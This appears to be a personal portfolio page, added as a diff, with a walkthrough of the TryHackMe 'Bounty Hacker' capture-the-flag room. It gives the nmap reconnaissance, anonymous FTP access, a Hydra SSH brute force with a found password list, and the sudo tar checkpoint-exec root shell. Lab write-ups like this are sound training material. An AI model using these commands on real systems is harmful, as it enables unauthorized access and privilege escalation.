@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bounty Hacker — Walkthrough</title>
+    <link rel="stylesheet" href="Writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+
+<div class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>Bounty Hacker — Walkthrough</h1>
+
+        <p><strong>Target:</strong> TryHackMe — Bounty Hacker</p>
+
+        <h2>Initial Recon</h2>
+        <p>I started with a full Nmap scan to see what was exposed:</p>
+
+<pre><code>nmap -sC -sV -p- -T4 10.10.95.136</code></pre>
+
+        <p>I also checked the website manually and intercepted traffic with Burp Suite, but nothing useful came up.</p>
+
+        <p><strong>Nmap results showed:</strong></p>
+        <ul>
+            <li>21/tcp — ftp — vsftpd 3.0.3</li>
+            <li>22/tcp — ssh — OpenSSH 7.2p2 Ubuntu</li>
+            <li>80/tcp — http — Apache 2.4.18</li>
+        </ul>
+
+        <h2>FTP Access</h2>
+        <p>I tried logging into FTP anonymously and it worked:</p>
+
+<pre><code>ftp anonymous@10.10.95.136</code></pre>
+
+        <p>Inside the FTP directory, I found two files: <code>locks.txt</code> and <code>task.txt</code>.</p>
+
+<pre><code>get locks.txt
+get task.txt</code></pre>
+
+        <p><code>locks.txt</code> looked like a password list.</p>
+
+        <h2>Brute Forcing SSH</h2>
+        <p>I used Hydra to brute force the SSH login for the user <code>lin</code>:</p>
+
+<pre><code>hydra -l lin -P locks.txt ssh://10.10.95.136</code></pre>
+
+        <p>Hydra successfully found the correct password.</p>
+
+        <h2>User Flag</h2>
+        <p>Once I logged in via SSH, I grabbed the user flag:</p>
+
+<pre><code>ssh lin@10.10.95.136
+cat user.txt</code></pre>
+
+        <h2>Privilege Escalation</h2>
+        <p>Then I checked what commands I could run with sudo:</p>
+
+<pre><code>sudo -l</code></pre>
+
+        <p>The output showed that <code>lin</code> could run <code>/bin/tar</code> as root.</p>
+
+        <p>I used the classic tar exploit to escalate privileges:</p>
+
+<pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+whoami</code></pre>
+
+        <p>This popped a root shell.</p>
+
+        <h2>Root Flag</h2>
+
+<pre><code>cat /root/root.txt</code></pre>
+
+        <p>Room completed.</p>
+
+    </div>
+</section>
+
+</body>
+</html>
